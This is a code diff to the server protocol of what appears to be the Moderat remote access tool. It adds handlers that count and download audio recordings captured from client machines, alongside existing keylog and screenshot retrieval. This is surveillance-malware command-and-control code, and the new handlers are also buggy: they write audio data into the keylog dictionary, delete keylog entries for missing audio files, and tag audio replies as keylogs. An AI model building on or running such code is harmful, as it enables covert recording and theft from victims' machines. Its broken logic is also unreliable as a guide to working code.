@@ -280,6 +280,13 @@ class ModeratServerProtocol(Protocol):
             self.send_message_to_moderator(self, '%s/%s' % (not_downloaded, downloaded), 'countKeylogs')
             log.info('Keylogs Count Sent to Moderator')
 
+        elif data['mode'] == 'countAudios':
+            client_id, date = data['payload'].split()
+            not_downloaded = manageAudio.get_audios_count_0(client_id, date)
+            downloaded = manageAudio.get_audios_count_1(client_id, date)
+            self.send_message_to_moderator(self, '%s/%s' % (not_downloaded, downloaded), 'countAudios')
+            log.info('Audios Count Sent to Moderator')
+
         # TODO: Download Screenshots
         elif data['mode'] == 'downloadScreenshots':
             client_id, date, filter_downloaded = data['payload'].split()
@@ -344,6 +351,39 @@ class ModeratServerProtocol(Protocol):
                 self.send_message_to_moderator(self, self.keylogs_dict[keylog_name], 'downloadKeylog')
                 manageKeylogs.set_keylog_viewed(self.keylogs_dict[keylog_name]['datetime'])
                 del self.keylogs_dict[keylog_name]
+            else:
+                self.send_message_to_moderator(self, 'noDataFound', 'noDataFound')
+
+        # TODO: Download Audios
+        elif data['mode'] == 'downloadAudios':
+            client_id, date, filter_downloaded = data['payload'].split()
+            if int(filter_downloaded) == 1:
+                audios_list = manageAudio.get_all_new_audios(client_id, date)
+            else:
+                audios_list = manageAudio.get_all_audios(client_id, date)
+            if len(audios_list) > 0:
+                audios_names = []
+                for audio in audios_list:
+                    if os.path.exists(audio[3]):
+                        self.audio_dict[audio[1]] = {}
+                        self.keylogs_dict[audio[1]]['datetime'] = audio[1]
+                        self.keylogs_dict[audio[1]]['date'] = audio[2]
+                        self.keylogs_dict[audio[1]]['raw'] = open(audio[3], 'rb').read()
+                        audios_names.append(audio[1])
+                    else:
+                        log.info('File Not Found Delete Entry (%s)' % audio[3])
+                        manageKeylogs.delete_keylog(audio[1])
+                # Send Data Count
+                self.send_message_to_moderator(self, audios_names, len(audios_list))
+            else:
+                self.send_message_to_moderator(self, 'noDataFound', 'noDataFound')
+
+        elif data['mode'] == 'downloadAudio':
+            audio_name = data['payload']
+            if self.audio_dict.has_key(audio_name):
+                self.send_message_to_moderator(self, self.audio_dict[audio_name], 'downloadKeylog')
+                manageAudio.set_audio_viewed(self.audio_dict[audio_name]['datetime'])
+                del self.keylogs_dict[audio_name]
             else:
                 self.send_message_to_moderator(self, 'noDataFound', 'noDataFound')
 
